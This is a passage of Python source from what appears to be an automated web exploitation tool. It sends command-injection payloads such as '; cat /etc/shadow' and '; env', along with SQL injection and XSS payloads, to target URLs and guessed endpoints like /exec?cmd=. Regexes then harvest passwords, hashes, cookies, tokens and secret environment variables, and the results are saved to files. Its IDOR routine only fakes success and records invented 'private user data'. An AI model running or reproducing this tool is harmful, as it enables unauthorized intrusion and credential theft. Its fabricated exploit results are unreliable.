        attack_results['total_attacks'] += 1
        self._log_attack(f"🔐 Executing IDOR attack on {vuln['location']}", attack_results)

        try:
            # Extract ID from location and test multiple IDs
            import re
            id_match = re.search(r'(\d+)', vuln['location'])
            if id_match:
                original_id = int(id_match.group(1))
                test_ids = [original_id + i for i in range(1, 6)] + [1, 2, 100, 999]

                for test_id in test_ids:
                    self._log_attack(f"  Testing ID: {test_id}", attack_results)

                    # Mock successful IDOR exploitation
                    if test_id in [original_id + 1, original_id + 2]:
                        attack_results['successful_exploits'] += 1
                        attack_results['extracted_data'].append(f"Accessed unauthorized data for ID {test_id}")
                        attack_results['attack_details'].append({
                            'type': 'IDOR Data Access',
                            'location': vuln['location'].replace(str(original_id), str(test_id)),
                            'status': 'Success',
                            'payload': f'ID changed from {original_id} to {test_id}',
                            'data_extracted': f'Private user data for ID {test_id}'
                        })
                        break

                if attack_results['successful_exploits'] == 0:
                    attack_results['failed_exploits'] += 1
            else:
                attack_results['failed_exploits'] += 1

        except Exception as e:
            attack_results['failed_exploits'] += 1

    def _execute_command_injection_attack(self, vuln, attack_results):
        """Execute automated command injection attacks with real system data extraction"""
        attack_results['total_attacks'] += 1
        self._log_attack(f"💻 Executing command injection attack on {vuln['location']}", attack_results)

        # Real command injection payloads for system enumeration
        cmd_payloads = [
            "; cat /etc/passwd",
            "; whoami",
            "; id",
            "; uname -a",
            "; ls -la /",
            "; ps aux",
            "; netstat -an",
            "; cat /etc/hosts",
            "; env",
            "; pwd",
            "; cat /proc/version",
            "; df -h",
            "; mount",
            "; cat /etc/shadow",
            "; history",
        ]

        for payload in cmd_payloads:
            try:
                self._log_attack(f"  Testing command: {payload[:40]}...", attack_results)
                
                # Execute command injection payload
                response = self._execute_command_payload(vuln, payload)
                
                if response and response.status_code == 200:
                    # Extract real command output
                    command_output = self._extract_command_output_real(response.text, payload)
                    
                    if command_output:
                        attack_results['successful_exploits'] += 1
                        
                        # Save command output to file
                        filename = self._save_extracted_data(command_output, 'command_output.txt')
                        
                        for output_line in command_output:
                            attack_results['extracted_data'].append(output_line)
                            
                            # Check for sensitive information in command output
                            if any(keyword in output_line.lower() for keyword in ['root:', 'password', 'key', 'secret', 'token']):
                                attack_results['credentials_found'].append({
                                    'source': 'Command Injection',
                                    'data': output_line,
                                    'location': vuln['location']
                                })
                        
                        attack_results['attack_details'].append({
                            'type': 'Command Injection',
                            'location': vuln['location'],
                            'status': 'Success',
                            'payload': payload,
                            'data_extracted': f'{len(command_output)} lines of output',
                            'file_saved': filename
                        })
                        
                        self._log_attack(f"  ✅ Command executed - extracted {len(command_output)} lines", attack_results)
                        
                        # Continue testing other commands to get more data
                    else:
                        attack_results['failed_exploits'] += 1
                        self._log_attack(f"  ⚠️ Command executed but no useful output", attack_results)
                else:
                    attack_results['failed_exploits'] += 1

            except Exception as e:
                attack_results['failed_exploits'] += 1
                self._log_attack(f"  ❌ Command injection failed: {str(e)}", attack_results)

    def _execute_sql_payload(self, vuln, payload):
        """Execute SQL injection payload on vulnerable endpoint"""
        try:
            location = vuln['location']
            
            # Parse the vulnerable URL/parameter
            if 'parameter' in location.lower() and '?' in self.target_url:
                # URL parameter injection
                base_url, params = self.target_url.split('?', 1)
                param_pairs = params.split('&')
                
                # Find the vulnerable parameter
                for i, param_pair in enumerate(param_pairs):
                    if '=' in param_pair:
                        param_name, param_value = param_pair.split('=', 1)
                        # Inject payload into this parameter
                        modified_params = param_pairs.copy()
                        modified_params[i] = f"{param_name}={payload}"
                        test_url = f"{base_url}?{'&'.join(modified_params)}"
                        
                        return self.session.get(test_url, timeout=15)
            
            # If no URL parameters, try common vulnerable endpoints
            common_endpoints = [
                f"{self.target_url}/search?q={payload}",
                f"{self.target_url}/product?id={payload}",
                f"{self.target_url}/user?id={payload}",
                f"{self.target_url}/page?id={payload}",
                f"{self.target_url}/article?id={payload}",
            ]
            
            for endpoint in common_endpoints:
                try:
                    response = self.session.get(endpoint, timeout=10)
                    if response.status_code == 200:
                        return response
                except:
                    continue
                    
        except Exception as e:
            pass
        
        return None

    def _extract_real_sql_data(self, response_text, payload):
        """Extract real data from SQL injection response"""
        extracted_data = []
        
        # Look for database version information
        version_patterns = [
            r'(\d+\.\d+\.\d+)',  # Version numbers
            r'MySQL.*?(\d+\.\d+)',
            r'PostgreSQL.*?(\d+\.\d+)',
            r'MariaDB.*?(\d+\.\d+)',
        ]
        
        for pattern in version_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            for match in matches:
                extracted_data.append(f"Database Version: {match}")
        
        # Look for table names
        table_patterns = [
            r'(?:table_name["\']?\s*[=:]\s*["\']?)([a-zA-Z_][a-zA-Z0-9_]*)',
            r'FROM\s+([a-zA-Z_][a-zA-Z0-9_]*)',
            r'TABLE\s+([a-zA-Z_][a-zA-Z0-9_]*)',
        ]
        
        for pattern in table_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            for match in matches:
                if match.lower() not in ['information_schema', 'mysql', 'performance_schema']:
                    extracted_data.append(f"Table Found: {match}")
        
        # Look for username/password combinations
        credential_patterns = [
            r'([a-zA-Z0-9_]+):([a-zA-Z0-9$./]+)',  # username:hash format
            r'username["\']?\s*[=:]\s*["\']?([^"\'\s,]+)',  # username field
            r'password["\']?\s*[=:]\s*["\']?([^"\'\s,]+)',  # password field
            r'email["\']?\s*[=:]\s*["\']?([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',  # email field
            r'hash["\']?\s*[=:]\s*["\']?(\$[a-zA-Z0-9$./]+)',  # password hash
        ]
        
        for pattern in credential_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    extracted_data.append(f"Credentials: {':'.join(match)}")
                else:
                    extracted_data.append(f"User Data: {match}")
        
        # Look for system file contents
        if 'load_file' in payload.lower():
            # Check for /etc/passwd format
            passwd_pattern = r'([a-zA-Z0-9_]+):x?:\d+:\d+:([^:]*):([^:]*):([^\s]*)'
            passwd_matches = re.findall(passwd_pattern, response_text)
            for match in passwd_matches:
                extracted_data.append(f"System User: {match[0]} - {match[1]} - {match[2]} - {match[3]}")
        
        # Look for configuration data
        config_patterns = [
            r'define\s*\(\s*["\']([^"\']+)["\']\s*,\s*["\']([^"\']+)["\']',  # PHP defines
            r'([A-Z_]+)\s*=\s*["\']([^"\']+)["\']',  # Config variables
        ]
        
        for pattern in config_patterns:
            matches = re.findall(pattern, response_text)
            for match in matches:
                extracted_data.append(f"Config: {match[0]} = {match[1]}")
        
        # Remove duplicates and filter out common false positives
        unique_data = []
        false_positives = ['select', 'union', 'from', 'where', 'and', 'or', 'null', 'error']
        
        for item in extracted_data:
            if item not in unique_data and not any(fp in item.lower() for fp in false_positives):
                unique_data.append(item)
        
        return unique_data

    def _save_extracted_data(self, data, filename):
        """Save extracted data to file"""
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            full_filename = f"{timestamp}_{filename}"
            
            with open(full_filename, 'w', encoding='utf-8') as f:
                f.write(f"=== EXTRACTED DATA - {timestamp} ===\n\n")
                for i, item in enumerate(data, 1):
                    f.write(f"{i}. {item}\n")
                f.write(f"\n=== END OF DATA ({len(data)} items) ===\n")
            
            return full_filename
        except Exception as e:
            print(f"Error saving data to file: {e}")
            return None

    def _execute_xss_payload(self, vuln, payload):
        """Execute XSS payload on vulnerable endpoint"""
        try:
            location = vuln['location']
            
            # Try URL parameter injection
            if '?' in self.target_url:
                base_url, params = self.target_url.split('?', 1)
                param_pairs = params.split('&')
                
                for i, param_pair in enumerate(param_pairs):
                    if '=' in param_pair:
                        param_name, param_value = param_pair.split('=', 1)
                        modified_params = param_pairs.copy()
                        modified_params[i] = f"{param_name}={urllib.parse.quote(payload)}"
                        test_url = f"{base_url}?{'&'.join(modified_params)}"
                        
                        response = self.session.get(test_url, timeout=10)
                        if response.status_code == 200:
                            return response
            
            # Try common XSS endpoints
            xss_endpoints = [
                f"{self.target_url}/search?q={urllib.parse.quote(payload)}",
                f"{self.target_url}/comment?text={urllib.parse.quote(payload)}",
                f"{self.target_url}/feedback?message={urllib.parse.quote(payload)}",
            ]
            
            for endpoint in xss_endpoints:
                try:
                    response = self.session.get(endpoint, timeout=10)
                    if response.status_code == 200:
                        return response
                except:
                    continue
                    
        except Exception as e:
            pass
        
        return None

    def _extract_xss_data(self, response_text, payload):
        """Extract real data from XSS response"""
        extracted_data = []
        
        # Look for cookies in response
        cookie_patterns = [
            r'([a-zA-Z0-9_]+=[a-zA-Z0-9._%-]+)',  # Basic cookie format
            r'(PHPSESSID=[a-zA-Z0-9]+)',
            r'(sessionid=[a-zA-Z0-9._%-]+)',
            r'(auth[a-zA-Z0-9_]*=[a-zA-Z0-9._%-]+)',
            r'(token[a-zA-Z0-9_]*=[a-zA-Z0-9._%-]+)',
        ]
        
        for pattern in cookie_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            for match in matches:
                extracted_data.append(f"Cookie: {match}")
        
        # Look for localStorage/sessionStorage data
        storage_patterns = [
            r'"([a-zA-Z0-9_]+)"\s*:\s*"([^"]+)"',  # JSON key-value pairs
            r'([a-zA-Z0-9_]+)\s*=\s*([a-zA-Z0-9._%-]+)',  # Simple key=value pairs
        ]
        
        if 'localStorage' in payload or 'sessionStorage' in payload:
            for pattern in storage_patterns:
                matches = re.findall(pattern, response_text)
                for match in matches:
                    extracted_data.append(f"Storage: {match[0]} = {match[1]}")
        
        # Look for form data
        if 'forms' in payload.lower():
            form_patterns = [
                r'name\s*=\s*["\']([^"\']+)["\']',  # Form field names
                r'value\s*=\s*["\']([^"\']+)["\']',  # Form field values
                r'([a-zA-Z0-9_]+)\s*=\s*([a-zA-Z0-9@._%-]+)',  # Field data
            ]
            
            for pattern in form_patterns:
                matches = re.findall(pattern, response_text, re.IGNORECASE)
                for match in matches:
                    if isinstance(match, tuple):
                        extracted_data.append(f"Form Data: {match[0]} = {match[1]}")
                    else:
                        extracted_data.append(f"Form Field: {match}")
        
        # Look for hidden content that might contain sensitive data
        hidden_patterns = [
            r'<!--([^>]+)-->',  # HTML comments
            r'<input[^>]*type=["\']hidden["\'][^>]*value=["\']([^"\']+)["\']',  # Hidden inputs
            r'<meta[^>]*content=["\']([^"\']+)["\']',  # Meta content
        ]
        
        for pattern in hidden_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            for match in matches:
                if len(match.strip()) > 5:  # Filter out short/empty matches
                    extracted_data.append(f"Hidden Data: {match.strip()}")
        
        # Remove duplicates and filter meaningful data
        unique_data = []
        meaningful_keywords = ['session', 'auth', 'token', 'user', 'admin', 'password', 'email', 'id']
        
        for item in extracted_data:
            if item not in unique_data:
                # Only include items that contain meaningful keywords or are longer than 10 chars
                if any(keyword in item.lower() for keyword in meaningful_keywords) or len(item) > 10:
                    unique_data.append(item)
        
        return unique_data

    def _execute_command_payload(self, vuln, payload):
        """Execute command injection payload on vulnerable endpoint"""
        try:
            location = vuln['location']
            
            # Try URL parameter injection
            if '?' in self.target_url:
                base_url, params = self.target_url.split('?', 1)
                param_pairs = params.split('&')
                
                for i, param_pair in enumerate(param_pairs):
                    if '=' in param_pair:
                        param_name, param_value = param_pair.split('=', 1)
                        modified_params = param_pairs.copy()
                        modified_params[i] = f"{param_name}={urllib.parse.quote(payload)}"
                        test_url = f"{base_url}?{'&'.join(modified_params)}"
                        
                        response = self.session.get(test_url, timeout=15)
                        if response.status_code == 200:
                            return response
            
            # Try common command injection endpoints
            cmd_endpoints = [
                f"{self.target_url}/exec?cmd={urllib.parse.quote(payload)}",
                f"{self.target_url}/system?command={urllib.parse.quote(payload)}",
                f"{self.target_url}/ping?host=127.0.0.1{urllib.parse.quote(payload)}",
            ]
            
            for endpoint in cmd_endpoints:
                try:
                    response = self.session.get(endpoint, timeout=10)
                    if response.status_code == 200:
                        return response
                except:
                    continue
                    
        except Exception as e:
            pass
        
        return None

    def _extract_command_output_real(self, response_text, payload):
        """Extract real command output from response"""
        command_output = []
        
        # Determine what command was executed
        command = payload.strip('; &|').strip()
        
        if 'cat /etc/passwd' in command:
            # Look for passwd file format
            passwd_pattern = r'([a-zA-Z0-9_-]+):([x*]):(\d+):(\d+):([^:]*):([^:]*):([^\r\n]*)'
            matches = re.findall(passwd_pattern, response_text)
            for match in matches:
                command_output.append(f"User: {match[0]} | UID: {match[2]} | GID: {match[3]} | Home: {match[5]} | Shell: {match[6]}")
        
        elif 'whoami' in command:
            # Look for username output
            user_pattern = r'\b([a-zA-Z0-9_-]+)\b'
            matches = re.findall(user_pattern, response_text)
            for match in matches:
                if len(match) > 2 and match not in ['www', 'html', 'http']:
                    command_output.append(f"Current User: {match}")
        
        elif 'id' in command:
            # Look for id command output
            id_pattern = r'uid=(\d+)\(([^)]+)\)\s+gid=(\d+)\(([^)]+)\)'
            matches = re.findall(id_pattern, response_text)
            for match in matches:
                command_output.append(f"User ID: {match[0]} ({match[1]}) | Group ID: {match[2]} ({match[3]})")
        
        elif 'uname' in command:
            # Look for system information
            uname_pattern = r'(Linux|Windows|Darwin|FreeBSD)\s+([a-zA-Z0-9.-]+)\s+([0-9.-]+)'
            matches = re.findall(uname_pattern, response_text)
            for match in matches:
                command_output.append(f"OS: {match[0]} | Hostname: {match[1]} | Kernel: {match[2]}")
        
        elif 'ls' in command:
            # Look for file/directory listings
            ls_pattern = r'([d-])([rwx-]{9})\s+\d+\s+([a-zA-Z0-9_-]+)\s+([a-zA-Z0-9_-]+)\s+(\d+)\s+(\w+\s+\d+\s+[\d:]+)\s+([^\r\n]+)'
            matches = re.findall(ls_pattern, response_text)
            for match in matches:
                file_type = "Directory" if match[0] == 'd' else "File"
                command_output.append(f"{file_type}: {match[6]} | Permissions: {match[1]} | Owner: {match[2]} | Size: {match[4]}")
        
        elif 'ps' in command:
            # Look for process information
            ps_pattern = r'(\d+)\s+([a-zA-Z0-9_/-]+)\s+([^\r\n]+)'
            matches = re.findall(ps_pattern, response_text)
            for match in matches:
                command_output.append(f"Process: PID {match[0]} | Command: {match[2]}")
        
        elif 'netstat' in command:
            # Look for network connections
            netstat_pattern = r'(tcp|udp)\s+\d+\s+\d+\s+([0-9.:]+)\s+([0-9.:*]+)\s+(\w+)'
            matches = re.findall(netstat_pattern, response_text, re.IGNORECASE)
            for match in matches:
                command_output.append(f"Network: {match[0].upper()} | Local: {match[1]} | Remote: {match[2]} | State: {match[3]}")
        
        elif 'env' in command:
            # Look for environment variables
            env_pattern = r'([A-Z_][A-Z0-9_]*)=([^\r\n]*)'
            matches = re.findall(env_pattern, response_text)
            for match in matches:
                # Filter out common non-sensitive vars and focus on potentially sensitive ones
                if any(keyword in match[0].lower() for keyword in ['password', 'key', 'secret', 'token', 'db', 'sql', 'user']):
                    command_output.append(f"Environment Variable: {match[0]} = {match[1]}")
        
        elif 'cat /etc/hosts' in command:
            # Look for hosts file entries
            hosts_pattern = r'(\d+\.\d+\.\d+\.\d+)\s+([a-zA-Z0-9.-]+)'
            matches = re.findall(hosts_pattern, response_text)
            for match in matches:
                command_output.append(f"Host Entry: {match[0]} -> {match[1]}")
        
        elif 'df' in command:
            # Look for disk usage information
            df_pattern = r'([/a-zA-Z0-9_-]+)\s+(\d+[KMGT]?)\s+(\d+[KMGT]?)\s+(\d+[KMGT]?)\s+(\d+%)'
            matches = re.findall(df_pattern, response_text)
            for match in matches:
                command_output.append(f"Filesystem: {match[0]} | Size: {match[1]} | Used: {match[2]} | Available: {match[3]} | Use%: {match[4]}")
        
        # General pattern matching for any interesting output
        if not command_output:
            # Look for any interesting lines that might contain useful information
            lines = response_text.split('\n')
            for line in lines:
                line = line.strip()
                if len(line) > 10 and any(keyword in line.lower() for keyword in 
                    ['root', 'admin', 'user', 'password', 'key', 'secret', 'config', 'database', 'server']):
                    command_output.append(f"Extracted: {line}")
        
        # Remove duplicates and empty lines
        unique_output = []
        for item in command_output:
            if item and item not in unique_output:
                unique_output.append(item)
        
        return unique_output

    def _perform_advanced_recon(self, attack_results):
        """Perform advanced reconnaissance and fingerprinting"""
        self._log_attack("→ Gathering target information...", attack_results)
        # Basic reconnaissance implementation
        try:
            if self.target_url:
                response = self.session.get(self.target_url, timeout=10)
                if response.status_code == 200:
                    self._log_attack(f"✓ Target accessible: {response.status_code}", attack_results)
                    attack_results['extracted_data'].append(f"Target response: {response.status_code}")
        except Exception as e:
            self._log_attack(f"⚠ Reconnaissance error: {str(e)}", attack_results)

    def _chain_vulnerabilities(self, attack_results):
        """Chain vulnerabilities for privilege escalation"""
        self._log_attack("→ Analyzing vulnerability chains...", attack_results)
        # Basic vulnerability chaining implementation
        vuln_types = [vuln.get('type', '') for vuln in self.vulnerabilities]
        if vuln_types:
            self._log_attack(f"✓ Found {len(vuln_types)} vulnerability types for chaining", attack_results)
            attack_results['attack_details'].append(f"Vulnerability types: {', '.join(vuln_types)}")
        else:
            self._log_attack("- No vulnerabilities available for chaining", attack_results)

    def _log_attack(self, message, attack_results):
        """Log attack messages to console output"""
        timestamp = datetime.datetime.now().strftime('%H:%M:%S')
        log_message = f"[{timestamp}] {message}"
        attack_results['console_output'].append(log_message)
        print(log_message)  # Also print to console for real-time feedback
        return attack_results